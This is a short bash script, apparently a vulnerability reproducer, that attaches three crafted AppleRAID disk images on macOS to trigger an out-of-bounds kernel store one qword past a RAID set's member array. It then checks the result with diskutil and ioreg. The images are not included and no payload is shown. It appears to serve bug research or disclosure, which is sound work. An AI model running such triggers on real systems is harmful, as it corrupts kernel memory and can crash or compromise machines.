#!/bin/bash
set -euxo pipefail

D='/Volumes/My Shared Files/apple_raid'

date -u
id
sw_vers
sysctl kern.version

echo '=== A1 establishes physical member capacity 8 ==='
hdiutil attach -nomount -readonly -imagekey diskimage-class=CRawDiskImage \
  "$D/appleraid_v1_stripe_seqgap_first_cap8_idx0_seq1_26A5416b.dmg"

echo '=== A2 refreshes logical count to 9 without resizing ==='
hdiutil attach -nomount -readonly -imagekey diskimage-class=CRawDiskImage \
  "$D/appleraid_v1_stripe_seqgap_second_count9_idx1_seq2_26A5416b.dmg"

echo '=== before A3: logical index 8 is missing ==='
diskutil appleRAID list

echo '=== A3 targets logical index 8, one qword past physical capacity ==='
hdiutil attach -nomount -readonly -imagekey diskimage-class=CRawDiskImage \
  "$D/appleraid_v1_stripe_seqgap_third_count9_idx8_seq2_26A5416b.dmg"

echo '=== after A3: index 8 is Online, proving the member-pointer store ==='
diskutil appleRAID list
ioreg -l -w0 -r -c AppleRAIDSet
date -u
